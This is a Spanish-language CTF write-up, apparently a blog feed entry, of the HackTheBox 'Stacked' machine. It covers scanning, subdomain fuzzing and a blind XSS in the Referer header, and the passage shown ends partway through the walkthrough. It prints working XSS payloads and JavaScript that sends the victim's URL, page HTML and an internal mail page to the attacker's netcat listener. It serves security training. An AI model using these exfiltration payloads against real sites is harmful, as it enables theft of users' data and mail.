<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-27T09:47:23-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fr4nzisko</title><subtitle>Redacción de máquinas *CTF* hechas en plataformas como **HackTheBox** y **TryHackMe**.</subtitle><author><name>Fr4nzisko</name></author><entry><title type="html">Stacked - HackTheBox</title><link href="http://localhost:4000/hackthebox/Stacked/" rel="alternate" type="text/html" title="Stacked - HackTheBox" /><published>2022-04-09T00:00:00-04:00</published><updated>2022-04-09T00:00:00-04:00</updated><id>http://localhost:4000/hackthebox/Stacked</id><content type="html" xml:base="http://localhost:4000/hackthebox/Stacked/">&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162567844-d6f57cec-8a31-4f6d-9c72-b540b9539d02.jpg&quot; alt=&quot;Stackedinsane&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Comencé con un escaneo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para detectar puertos abiertos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/HTB/Altered/nmap]
└──╼ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;nmap.txt
&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Tue Apr  5 00:07:08 2022 as: nmap -sS --min-rate 5000 -v -n -p- --open -Pn -o nmap.txt 10.10.11.112&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.112
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 52678 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 12855 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
&lt;span class=&quot;c&quot;&gt;# Nmap done at Tue Apr  5 00:09:43 2022 -- 1 IP address (1 host up) scanned in 154.73 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Efectúe otro escaneo para identificar la versión de cada servicio abierto.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/HTB/Altered/nmap]
└──╼ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;services.txt
&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Tue Apr  5 00:09:49 2022 as: nmap -sCV -p80,22 -o services.txt 10.10.11.112&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;stacked.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.11.112&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.056s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41
|_http-title: STACKED.HTB
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Tue Apr  5 00:09:59 2022 -- 1 IP address (1 host up) scanned in 10.07 seconds&lt;/span&gt;
Tenia dos puertos abiertos: 22 y 80. De momento SSH no me servía, por lo que mire el servidor web.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;puerto-80&quot;&gt;Puerto 80&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162542058-fe18f6f0-716c-4253-abd3-60aeeaab11fe.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hacia un &lt;em&gt;Redirect&lt;/em&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stacked.htb&lt;/code&gt;, se estaba aplicando &lt;em&gt;Virtual Hosting&lt;/em&gt;: alojar distintos dominios en una misma dirección IP.&lt;/p&gt;

&lt;p&gt;Para poder acceder a este dominio, incluí &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stacked.htb&lt;/code&gt; en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; haciendo que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.11.159&lt;/code&gt; apunte a este.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162542270-ae82e720-1466-44f2-bdef-dc3fc38d2194.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si pude ver lo que tenía.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162539490-ac1ccea4-4b88-4d20-8817-a55569659bd0.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al parecer era un contador, nada interesante, probé inyecciones en el campo ‘email’ pero no era vulnerable.&lt;/p&gt;

&lt;h2 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h2&gt;

&lt;p&gt;Hice &lt;em&gt;fuzzing&lt;/em&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; para encontrar directorios:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162539914-9922bf05-b9ea-4800-b527-14162cf88e90.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Me encontró algunos directorios, pero no eran de importancia, efectúe &lt;em&gt;fuzzing&lt;/em&gt; de subdominios mediante la cabecera &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; y me encontró &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portfolio&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162550002-16eef189-6205-43c6-8c1e-52282cdb93ac.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo incluí en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162542467-87bccc15-e322-496f-807b-3019a58d00f9.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;portfoliostackedhtb&quot;&gt;portfolio.stacked.htb&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162542732-9c3901c1-9047-40ce-b6f4-1df84725f3db.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta página tenía tres secciones: Porfolio, About y Contact, todas estas estaban en la misma página.&lt;/p&gt;

&lt;p&gt;En About encontré un botón de descarga de un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162542894-b9b79211-04e1-4522-a163-bacc6455934b.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este es un archivo YAML donde se suelen definir volúmenes, redes y servicios, este era su contenido:&lt;/p&gt;

&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3.3&quot;&lt;/span&gt;

&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;localstack&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${LOCALSTACK_DOCKER_NAME-localstack_main}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localstack/localstack-full:0.12.6&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;network_mode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;bridge&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1:443:443&quot;&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1:4566:4566&quot;&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1:4571:4571&quot;&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SERVICES=serverless&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DEBUG=1&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DATA_DIR=/var/localstack/data&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;PORT_WEB_UI=${PORT_WEB_UI- }&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;DOCKER_HOST=unix:///var/run/docker.sock&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;HOST_TMP_FOLDER=&quot;/tmp/localstack&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/tmp/localstack:/tmp/localstack&quot;&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/var/run/docker.sock:/var/run/docker.sock&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Al parecer estaba montado en local AWS, esto me llamo la atencion por lo que lo deje en segundo plano.&lt;/p&gt;

&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;

&lt;p&gt;En la sección Contact encontré un formulario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162543455-4c6edddd-e327-4759-a6ce-92c0c9b12815.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este podría ser vulnerable a XSS, intente inyectar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;pero este lo detectaba.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162543579-8ff0f5cc-1ec7-4109-8f77-f7e2f524d799.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este punto decidí interceptar la petición con Burp para hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debugging&lt;/code&gt; en las cabeceras de la petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162543854-eafd3002-bf61-4fe9-902b-cffbf56da691.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Abrí un servidor con Python por el puerto 80 y probé a inyectar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;http://10.10.16.59/&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; en la cabecera &lt;em&gt;Referer&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162544074-7662d07d-a39b-4eb3-92d7-27fc34889e63.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y tras un pequeño intervalo de tiempo recibí una petición GET a mi servidor desde la máquina víctima.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162544209-25b5969e-960e-47f5-8099-b79d0452d602.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La cabecera &lt;em&gt;Referer&lt;/em&gt; era vulnerable a XSS.&lt;/p&gt;

&lt;h3 id=&quot;estrategia&quot;&gt;Estrategia&lt;/h3&gt;

&lt;p&gt;Mi idea era identificar si el servidor tenía interacción con algún usuario, por lo que me cree un pequeño script en JS con el siguiente contenido:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://10.10.16.59:9999/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este lo que iba a hacer es enviar una petición GET a mi sesión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; por el puerto 9999 con la ruta en la que se encontraba el usuario en ese momento.&lt;/p&gt;

&lt;p&gt;Abrí un servidor de Python por el puerto 8000 alojando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request-3.js&lt;/code&gt; y apunté a mi archivo JS desde el XSS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162544871-e17b5ff2-1cb8-45cc-9a31-b43604991314.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Espere un tiempo y recibí una conexión a mi sesión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; en la que contenía una ruta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162544592-0e724ada-b7ed-499c-a487-1fbe20a7f167.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al parecer el usuario estaba en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail.stacked.htb&lt;/code&gt;. Este subdominio no lo encontró &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; porque operaba localmente en la máquina y no tenía acceso a el de manera externa.&lt;/p&gt;

&lt;p&gt;El siguiente paso fue descargar el HTML de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mail.stacked.htb/read-mail.php?id=7&lt;/code&gt; y almacenarlo en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo que hice fue crear otro script en JS con el siguiente código:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://10.10.16.59:5555/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este lo que hace es enviar una petición POST a mi sesión de netcat con el código HTML de la página en la que se encontraba el usuario por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5555&lt;/code&gt; y almacenar este en un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Apunte a mi archivo JS llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request.js&lt;/code&gt; desde el XSS y recibí una conexión a mi sesión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162545501-0ace3a79-4a76-4a62-b705-029fcaffb8fd.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;esquema-de-ataque&quot;&gt;Esquema de ataque:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162549694-f2646995-76e5-4b23-96ff-710ee65c508d.png&quot; alt=&quot;Diagrama en blanco&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta era la página con el código HTML del usuario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162546326-2b628a81-cecf-40d4-a34e-d1587a2ec2cb.png&quot; alt=&quot;webservidor2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Había un usuario llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jeremy Taint&lt;/code&gt; con un hiperenlace que te redirigía a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/read-mail.php?id=1&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/162546383-87e5e3a6-7cdc-43fb-a192-65bfca15d8f6.png&quot; alt=&quot;0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto me llamo la atención, por lo que decidí descargar el HTML correspondiente con el siguiente código JS:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://mail.stacked.htb/read-mail.php?id=1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oReq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://10.10.16.59:5555/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

